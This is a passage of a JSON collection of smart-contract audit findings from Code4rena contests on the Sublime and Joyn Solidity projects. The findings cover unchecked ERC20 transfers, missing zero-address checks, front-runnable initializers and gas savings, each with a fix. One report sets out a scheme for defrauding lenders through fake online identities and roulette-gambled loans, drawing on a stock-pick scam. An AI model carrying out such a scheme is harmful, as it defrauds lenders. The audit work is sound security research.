    "body": "# LOW\n\n### Low#1: Functions lacking zero address checks in `PoolCreditLine.sol` `LenderPool.sol`\n\n[PoolCreditLine.constructor](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L592-L595)\n[LenderPool.constructor](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L205-L209)\n[LenderPool.create](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L247-L269)\n\nRecommend implementing zero address check.\n\n### Low#2: `PooledCreditLine.getPrincipal` should be declared to external\n\n[PooledCreditLine.getPrincipal](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1189-L1191)\n\n### Low#3: Start fee in `LenderPool.start` might not be received\n\n```\nIERC20(_borrowAsset).transfer(_to, _fee);\n```\n\nThe unsafe `transfer` function doesnt check the boolean return value to see if the fee has been received, leading to `_fee` not being delivered.\n\n[LenderPool.start](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327)\n\nRecommend implementing a check.\n\n# NON-CRITICAL\n\n### Non-crit#1: Outdated compiler version\n\n```\npragma solidity 0.7.6;\n```\n\nIt's a best practice to use the latest compiler version.\n\nOlder compilers might be susceptible to some bugs.\nRecommend changing the solidity version pragma to the latest version to enforce the use of an up to date compiler.\n\nList of known compiler bugs and their severity can be found here: https://etherscan.io/solcbuginfo\n\n### Non-crit#2: `uint` gas efficiency\n\n`uint256` is more gas efficient than `uint128`.\n\n[PooledCreditLine.sol](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L163-L165)\n\n### Non-crit#3: `_updateProtocolFeeFraction` added layer of security\n\n[\\_updateProtocolFeeFraction](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L524-L527)\n\nRecommend setting a limit to `protocolFeeFraction` as an extra layer of security in case `onlyOwner` gets compromised.\n\nExample:\n\n```\nfunction _updateProtocolFeeFraction(uint256 _protocolFeeFraction) internal {\n        require(_protocolFeeFraction <= SCALING_FACTOR, 'IUPFF1');\n        require(_protocolFeeFraction < ARBITRARY_NUMBER, 'IUPFF2');\n        protocolFeeFraction = _protocolFeeFraction;\n        emit ProtocolFeeFractionUpdated(_protocolFeeFraction);\n    }\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/34"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n1. Open TODOS\n\nConsider resolving the TODOs before deploying.\n\n```solidity\nPooledCreditLine/PooledCreditLine.sol:794:        // TODO: Can directly transfer to borrower and cut down on 1 transfer\n```\n\n2. Implicit constant visibility\n\nConsider explicitly marking those as internal:\n\n```solidity\nPooledCreditLine/PooledCreditLine.sol:33:    uint256 constant YEAR_IN_SECONDS = 365 days;\nPooledCreditLine/PooledCreditLine.sol:34:    uint256 constant SCALING_FACTOR = 1e18;\n```\n\n3. All `initialize()` functions are front-runnable in the solution. \n\nI suggest adding some access control to them:\n\n```solidity\nPooledCreditLine/LenderPool.sol:\n  90:     function initialize() external initializer {}\n\nPooledCreditLine/PooledCreditLine.sol:\n  407:     function initialize(\n\nVerification/twitterVerifier.sol:\n  57:     function initialize(\n```\n\nThe one in `LenderPool.sol` doesn't do anything though\n\n4. Typo in revert strings\n\nReplace: \n\n```solidity\nPooledCreditLine/LenderPool.sol:219:            revert(\"cant withdraw\");\nPooledCreditLine/PooledCreditLine.sol:484:        require(_protocolFeeCollector != address(0), 'cant be 0 address');\nVerification/twitterVerifier.sol:125:        require(bytes(_userdata).length != 0, 'User doesnt exists');\nVerification/twitterVerifier.sol:137:        require(bytes(_userdata).length != 0, 'User does not exists');\n```\n\nwith\n\n```solidity\nPooledCreditLine/LenderPool.sol:219:            revert(\"can't withdraw\");\nPooledCreditLine/PooledCreditLine.sol:484:        require(_protocolFeeCollector != address(0), \"can't be 0 address\");\nVerification/twitterVerifier.sol:125:        require(bytes(_userdata).length != 0, 'User does not exist');\nVerification/twitterVerifier.sol:137:        require(bytes(_userdata).length != 0, 'User does not exist');\n```\n\n5. A revert string shouldn't be empty\n\n```solidity\nPooledCreditLine/LenderPool.sol:207:                require(_isLiquidationWithdrawn, \"\");\n```\n\n6. `approve` should be replace with `safeApprove`\n\n`approve` is subject to a known front-running attack. Consider using `safeApprove` instead:\n\n```solidity\nPooledCreditLine/LenderPool.sol:110:            SAVINGS_ACCOUNT.approve(_token, address(POOLED_CREDIT_LINE), type(uint256).max);\nPooledCreditLine/PooledCreditLine.sol:777:            IERC20(_collateralAsset).approve(_strategy, _amount);\nPooledCreditLine/PooledCreditLine.sol:840:        IERC20(_borrowAsset).approve(_strategy, _amount);\n```\n\n7. Immutable addresses should be 0-checked\n\nConsider adding an `address(0)` check here:\n\n```solidity\nFile: LenderPool.sol\n82:     constructor(\n83:         address _pooledCreditLine,\n84:         address _savingsAccount\n85:     ) {\n86:         POOLED_CREDIT_LINE = IPooledCreditLine(_pooledCreditLine); //@audit missing address(0) check on immutable address\n87:         SAVINGS_ACCOUNT = ISavingsAccount(_savingsAccount); //@audit missing address(0) check on immutable address\n88:     }\n\nFile: PooledCreditLine.sol\n393:     constructor(address _lenderPool) {\n394:         lenderPool = _lenderPool; //@audit missing address(0) check on immutable address\n395:     }\n```\n\n8. Missing comments\n\nThe following comments are missing (see `@audit` tags):\n\n```solidity\nPooledCreditLine/PooledCreditLine.sol:\n   298:      * @param _max maximum threshold of the parameter //@audit missing @return bool\n   405:      * @param _protocolFeeCollector address to which protocol fee is charged to  //@audit missing @param _borrowerVerifier & @param _verification\n  1040:      * @param _id identifier for the credit line //@audit missing @return address & @return uint256\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/33"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Recommendations\n\n- Upgrade to 0.8.0 or above so that you don't need to use SafeMath and overflow/underflow is checked by default. This will prevent accidental, unchecked arithmetic expressions creeping into the code base.\n\n## Low: Don't use `safeApprove` since it has been deprecated\n\n### Impact\n\nThere is a use of `safeApprove` in LenderPool.sol on [line 335](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L335).\n\nOpenZeppelin have _deprecated_ this function [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/2bd75a44bb5f419d132bdca6f1bf483d1479f550/contracts/token/ERC20/utils/SafeERC20.sol#L38-L58). A deeper discussion of the issue can be found in this [GitHub Issue](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2219).\n\n### Recommended Mitigation Steps\n\nThe general advice is to use calls to `safeIncreaseAllowance` or `safeDecreaseAllowance` instead. In this particular case one would need to determine whether the allowance was being increased or decreased by first calling IERC20's `allowance` function and comparing the result to the `_amount` parameter of function `_accept`.\n\n\n\n## Out of Scope: Outline of an attack that could be carried out even if smart contracts have no bugs\n\nThe attack I will outline is outside the scope of this audit competition. However, it could be carried out even if the smart contracts had no bugs.\n\nAs I understand it, Sublime relies on the linking of online identities to addresses. Examples of such online identities are Twitter/Reddit/Facebook accounts or email addresses. Verifiers will be tasked with performing the verification of identities off-chain.\n\nThe problem I see is that creating multiple false identities is not particularly hard. It is certainly much easier than creating a false identity that would be recognised in the physical world. e.g. by a nation's government.\n\nOne might counter this phenomenon by only lending small amounts of money to online identities that had not established much of a reputation. One would then expect that only those identities that developed a good reputation -- by paying back their loans -- would be given further loans by the lending community.\n\nHowever, this immediately reminds me of a well-known Stock Pick Scam. I outline this scam in the next section.\n\n### An outline of the Stock Pick Scam\n\nA large collection of email addresses is required. Let's choose 10000 for our example. Next:\n\n1. Choose a random stock\n2. To half the email addresses send them an email telling them you think the stock will go up. To the other half send them an email telling them you think the stock will go down.\n3. Wait a few weeks. Discard the half of the email addresses for which your prediction did not hold. For instance, if you sent an email to half of the email addresses saying the stock will go up but, in fact, it went down, then discard those email addresses.\n\nWe are now down to 5000 email addresses. Now repeat steps 1-3. You will now be down to 2500 email address. Continue this process for a few more steps. You will now have a much reduced set of email addresses for which you know the following is true: they will have received several stock pick predictions _all of which came true_.\n\nFor this small set of email addresses you now announce that they have received the limit of free stock predictions and they must now subscribe to your (expensive) Stock Pick Newsletter to receive more. The hope is that at least some of them, impressed by your track record, will hand over the money.\n\n### An analogous attack within a reputation-based lending community\n\nNow that I have outlined the Stock Pick Scam I would like to suggest an analogous attack in a reputation-based lending community that uses online identities.\n\nFirst cultivate many false identities for some period of time so that they have at least a semblance of authenticity. For each of these identities first get verified by verifier and then approach the lending community for a small loan.\n\nWith the money from each loan use it to gamble. Use a smart contract that allows you to gamble according to the rules of Roulette (e.g. https://crypto.games/roulette/ethereum). \n\nFor half of the loans put the money \"all on red\". For the other half put it \"all on black\".\n\nYou will win about half the time, and lose about half the time. Simply default on the half loans for those time you lost. And for the games of Roulette you won money on use the proceeds to repay those loans.\n\nThis will have the effect of increasing the reputation of those particular (false) identities. Now repeat the process several more times. You will be left with only a small number of identities with a good reputation but they will now have a significant track record of borrowing and paying back their loans.\n\nIt is likely that this will allow them to ask for even larger loans in the future which they can default on if they choose since the identity is, after all, false.\n\n### Recommended Mitigation Steps\n\nI have not yet thought of a way to mitigate this problem.\n\nThe problem with loans that are only tied to online identities is that the only way to punish defaulters is to stop lending them more money. In the physical world, where it is much harder to create a false identity, the loss of reputation is much harder to escape. Further penalties such as jail time can be applied for serial offenders (or first time offenders that defrauded enough money).\n\nMitigating this issues in an online environment will require a lot of careful consideration.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/31"
    }
  },
  {
    "title": "QA Report",
    "body": "1. There are a lot of methods and constructors without check any kind of input, as following you can see some of them:\n- [twitterVerifier.sol#L84-L89](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L84-L89)\n- [twitterVerifier.sol#L171](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L171)\n- [twitterVerifier.sol#L189](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L189)\n- [twitterVerifier.sol#L193](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L193)\n- [twitterVerifier.sol#L203](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L1203)\n- [twitterVerifier.sol#L207](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L1207)\n- [twitterVerifier.sol#L217](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L1217)\n- [twitterVerifier.sol#L221](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L1221)\n- [LenderPool.sol#L206-L208](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L206-L208)\n- [LenderPool.sol#L221](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L221)\n- [LenderPool.sol#L249-L254](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L249-L254)\n\n2. It is possible to register an empty `_twitterId` and it can never be unregistered. `_twitterId` is not marked so that it is not empty.\n- [unregisterSelf](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L159-L160)\n- [unregisterUser](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L172-L173)\n\n3. `create` method doesn't check that a record already exists with the same `_id`\n- [LenderPool.sol#L257](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L257)\n\n4. In the following places are made some ERC20 calls without checking the boolean result, ERC20 standard specify that the token can return false if the transfer or approve was not made, so it's mandatory to check the result of transfer methods.\n- [LenderPool.sol#L327](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327)\n- [PooledCreditLine.sol#L755](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L755)\n- [PooledCreditLine.sol#L1025](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1025)",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/28"
    }
  },
  {
    "title": "Pool Credit Line May Not Able to Start When _borrowAsset is Non ERC20 Compliant Tokens",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327\n\n\n# Vulnerability details\n\n## Impact\n```IERC20(_borrowAsset).transfer(_to, _fee);```\n\nIf the USDT token is supported as _borrowAsset, the unsafe version of .transfer(_to, _fee) may revert as there is no return value in the USDT token contract’s transfer() implementation (but the IERC20 interface expects a return value).\n\nFunction start() will break when _borrowAsset is USDT or Non ERC20 Compliant Tokens. USDT is one of the most borrowed Asset in DEFI. This may cause losing a lot of potential users.\n\n## Proof of Concept\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327\n\n## Recommended Mitigation Steps\nUse .safeTransfer instead of .transfer\n\n```IERC20(_borrowAsset).safeTransfer(_to, _fee);```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/27"
    }
  },
  {
    "title": "QA Report",
    "body": "## 1) function _accept() Use UnSafe and Deprecated safeApprove\n\n## Risk Rating: Low\n\n## Proof of Concept\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L335\n\n## Recommended\nThe OpenZeppelin SafeERC20 safeApprove() function has been deprecated. Using this deprecated function can lead to unintended reverts and potentially the locking of funds.\nDiscussion: https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2219\n\nAs suggested by the OpenZeppelin comment, replace safeApprove() with safeIncreaseAllowance().\n\n\n## 2) Suggest function liquidate() Open to Public Rather than Lenders Only\n\n## Risk Rating: Informational\n\n## Proof of Concept\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L606-L627\n\n## Recommended\n```@dev only one of the lenders can liquidate their pooled credit line```\n\nIs Impossible All Lenders know how to monitor their pooled credit line and call function liquidate(). Suggest Open function liquidate() to Public and so Bot Developer can built bot to monitor pooled credit line and call function liquidate() when needed.\n\n\n## 3) registerSelf() Incorrect @dev note\n\n## Risk Rating: Informational\n\n## Proof of Concept\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L105\n\n## Recommended\nThe @dev note in registerSelf() mention \"@dev only owner can register users\" but the function actually allow Users to register themselve. Suggest change to \"@dev users themselves can register themself\".\n\n\n## 4) updateVerification() Lack of Zero Address Check\n\n## Risk Rating: Low\n\n## Proof of Concept\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L189-L195\n\n## Recommended\nrequire(_verification != address(0), \"Address Can't Be Zero\")\n\n\n## 5) updateSignerAddress() Lack of Zero Address Check\n\n## Risk Rating: Low\n\n## Proof of Concept\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L203-L209\n\n## Recommended\nrequire(_signerAddress != address(0), \"Address Can't Be Zero\")\n\n\n## 6) Spelling Mistake \"idenitifer\"\n\n## Risk Rating: Informational\n\n## Proof of Concept\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L143\n\n## Recommended\nThere are multiple Spelling Mistake \"idenitifer\" in LenderPool.sol and PooledCreditLine.sol.\n\nThe correct spelling should be \"identifier\". Suggest use Find & Replace to find \"idenitifer\" and replace as \"identifier\".",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/25"
    }
  },
  {
    "title": "QA Report",
    "body": "* different pragma versions - the core-contracts use `pragma solidity ^0.8.0` and the rest of the contracts use `pragma solidity ^0.8.4`\n\n* use a specific solidity version instead of using `^`, to prevent future solidity versions impacting your code and creating issues.\n\n* In the comments and variable names you wrote ETH instead of wETH, which is un-correct (that's an ERC20 so it must be wETH)\n```sol\nfunction transferSplitAsset(address to, uint256 value)\n    private\n    returns (bool didSucceed)\n{\n    // Try to transfer ETH to the given recipient.\n    didSucceed = IERC20(splitAsset).transfer(to, value);\n    require(didSucceed, \"Failed to transfer ETH\");\n    emit TransferETH(to, value, didSucceed);\n}\n```\n\n* In the comment before the function, you wrote returns instead of the known `@return` tag\n```sol\n/**\n * @notice Mint token\n * @dev A starting index is calculated at the time of first mint\n * returns a tokenId\n * @param _to Token recipient\n */\nfunction mint(address _to) private returns (uint256 tokenId) {\n    if (startingIndex == 0) {\n        setStartingIndex();\n    }\n    tokenId = ((startingIndex + totalSupply()) % maxSupply) + 1;\n    _mint(_to, tokenId);\n}\n```\n\n* Low level calls (call, delegate call and static call) return success if the called contract doesn’t exist (not deployed or destructed), can be seen here https://github.com/Uniswap/v3-core/blob/main/audits/tob/audit.pdf (report #9) and here https://docs.soliditylang.org/en/develop/control-structures.html#error-handling-assert-require-revert-and-exceptions. \nThat means that in `attemptETHTransfer`, if `to` doesn't exist the call will fail but success will be set to true, which will act like the call was successful.\n```sol\nfunction attemptETHTransfer(address to, uint256 value)\n    private\n    returns (bool)\n    {\n        // Here increase the gas limit a reasonable amount above the default, and try\n        // to send ETH to the recipient.\n        // NOTE: This might allow the recipient to attempt a limited reentrancy attack.\n        (bool success, ) = to.call{value: value, gas: 30000}(\"\");\n        return success;\n    }\n```\n\n* add `onlyUnInitialized` modifier to the `initialize` function, otherwise the owner can initialize the contract more than one time\n\n* `HASHED_PROOF` - upper case variable name that is not constant\n\n* if `startingIndex + totalSupply()` will reach `type(uint256).max` the system will be in a stuck state, that's because the calculation in the _mint function will overflow\n\n* contracts not declaring that they implement their interfaces - for example `CoreCollection` and `CoreFactory` don't declare that they implement `ICoreCollection` and `ICoreFactory`\n\n* `ICoreFactory` is imported but not used in `CoreProxy`\n\n* didn't check that the address of the given vault is not zero in the `setPlatformFee` function\n\n* wrong comment in `RoyaltyVaultFactory` and `SplitFactory`\n```sol\n/**\n * @dev Set Platform fee for collection contract.\n * @param _platformFee Platform fee in scaled percentage. (5% = 200)\n * @param _vault vault address.\n */\nfunction setPlatformFee(address _vault, uint256 _platformFee) external {\n    IRoyaltyVault(_vault).setPlatformFee(_platformFee);\n}\n\n/**\n * @dev Set Platform fee recipient for collection contract.\n * @param _vault vault address.\n * @param _platformFeeRecipient Platform fee recipient.\n */\nfunction setPlatformFeeRecipient(\n    address _vault,\n    address _platformFeeRecipient\n) external {\n    require(_vault != address(0), \"Invalid vault\");\n    require(\n        _platformFeeRecipient != address(0),\n        \"Invalid platform fee recipient\"\n    );\n    IRoyaltyVault(_vault).setPlatformFeeRecipient(_platformFeeRecipient);\n}\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/131"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "2022-03-joyn gas optimization\n\n1 Use initial value for string. You set default value for HASHED_PROOF. To save deployment gas cost you can use initial value for string.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L27\n\nstring public HASHED_PROOF;\n\nAvg deployment from 3070877 to 3067973 with this change\n\n\n\n2 modifier onlyValidSupply used only one time in the contract. modifier onlyValidSupply is used only in initialize, so you can write this require statement directly in the function to save gas.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L51-L57\n\nAdd the following code to the top of initialize and remove from onlyValidSupply the function.\n\nrequire(\n    _maxSupply > 0,\n    \"CoreCollection: Max supply should be greater than 0\"    \n);\n\nAvg deployment from 3070877 to 3070313 with this change according to hardhat-gas-reporter\n\n\n3 use != 0 instead of > 0 in if sentence. The following line use > 0 in if sentence of mintToken. != is cheaper than > 0.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L161\n\nif (mintFee != 0) {} \n\n4 Use cache for royaltyVaultInitialized() in _handlePayment. royaltyVaultInitialized()is used twice in _handlePayment, so it will be cheaper to use cache royaltyVaultInitialized().\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/ERC721Payable.sol#L51-L55\n\nfunction _handlePayment(uint256 _amount) internal {\n    bool vaultInitialized = royaltyVaultInitialized();\n    address recipient = vaultInitialized\n      ? royaltyVault\n      : address(this);\n    payableToken.transferFrom(msg.sender, recipient, _amount);\n    emit NewPayment(msg.sender, recipient, _amount, vaultInitialized);\n}\n\nmintToken Avg from 228191 to 228124 with this change according to hardhat-gas-reporter \n\n5 delete == true. In require you don’t use == true to check return value of IERC20().transfer and can save a little bit gas cost.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L44\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L48\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L52-L55\n\nrequire(IERC20().transfer, “Failed to transfer royalty Asset to”);\n\n\n\n6 input validation must be checked earlier in the following function. royaltyAmount as input for incrementWindow must be checked at the top of the function to save gas cost in case of reverting with this validation.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L164\nAdd this require sentence to the beginning of the function.\n\n\n7 code duplication. splitAsset and royaltyAsset are always the same, so you can use a common variable for these variables. For example, you create new a variable transactionAsset instead of these variables. When you call createSplit, createSplitProxy will be called first and after that createVaultProxy will be called, so you can delete transactionAsset in createVaultProxy . You need to change the constructor of SplitProxy and ProxyVault too.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/SplitFactory.sol#L20-L21\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/SplitFactory.sol#L86-L87\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/SplitFactory.sol#L108-L109\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/SplitFactory.sol#L162\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/SplitFactory.sol#L172\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/ProxyVault.sol#L19\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/SplitProxy.sol#L20\n\naddress public transactionAsset;\n\n\n8 set royaltyVault immutable. There is no setter for royaltyVault in ProxyVault, so royaltyVault in ProxyVault can be immutable.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/ProxyVault.sol#L9\n\naddress internal immutable royaltyVault; \n\n\n9 use unchecked and prefix in for loop in the following loop.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L279\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L50\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L274\n\nfor (uint256 i; i < length;) {\n    unchecked {\n        ++i;\n    }\n}\n\n10 use calldata instead of memory in createProject. The following inputs are memory. You can use calldata instated of memory to save gas.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L71-L72\n\nstring memory _projectId,\nCollection[] memory _collections\n\ncreateProject() Avg from 602069 to 601329 only with this change according to hardhat-gas-reporter\n\n\n11 use calldata instead of memory in addCollection. The following inputs are memory. You can use calldata instated of memory to save gas.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L109-L110\n\nstring calldata _projectId,\nCollection calldata _collection\n\naddCollection() Avg from 442267 to 442141 only with this change according to hardhat-gas-reporter\n\n12 use calldata instead of memory in getProject.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L128\n",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/125"
    }
  },
  {
    "title": "QA Report",
    "body": "2022-03-joyn\n1 Lock pragmas to specific compiler version. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\nFor example, \n\npragma solidity 0.8.0; \n\n2 delete unused modifier. modifier onlyUnInitialized in CoreCollection is never used in the contract. You can delete it if you don’t use it.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L46-L49\n\nDelete it.\n\n\n3 modifier onlyInitialized used only one time in the contract. modifier onlyInitialized is used only in mintToken, so you can write this require statement directly in the function. From the view of gas, both have the same result.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L41-L44\n\nAdd the following code to the top of mintToken and remove onlyInitialized from the function. \n\nrequire(initialized, \"CoreCollection: Not initialized\");\n\n\n4 modifier tokenExists is never used. You can delete it. \n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L59-L62\n\nDelete it.\n\n\n5 startingIndexBlock is never used. startingIndexBlock will be set in setStartingIndex. However, this state variable will be never used. If you don’t use it, you can delete it.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L26\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L230\n\nDelete them.\n\n\n6 wrong description in comment of transferSplitAsset. Here you try to transfer ERC20 tokens. No ETH. \n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L235\n\nFor example,\n\n// Try to transfer splitAsset to the given recipient.\n\n\n7 delete an unused function. Ths following function is never used. I guess this function is there because of the fork. You can delete it.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L248-L257\n\nDelete it.\n\n\n8 event TransferETH has the wrong event name. The following line defines event TransferETH. However, ETH will be not transferred in transferSplitAsset. The event name and comment for it must be changed to avoid confusion.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L17-L18\n\nFor example,\n\nevent TransferSplitAsset();\n\n\n\n9 missing input validation in setPlatformFee. In setPlatformFee input address must be checked if the address is empty or not.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/SplitFactory.sol#L120-L125\n\nAdd the following code to the beginning of the function.\n\nrequire(_vault != address(0), 'Invalid vault');\n\n10 delete unused import statement. \n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L6\n\n11 delete unused import statement.\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L8\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
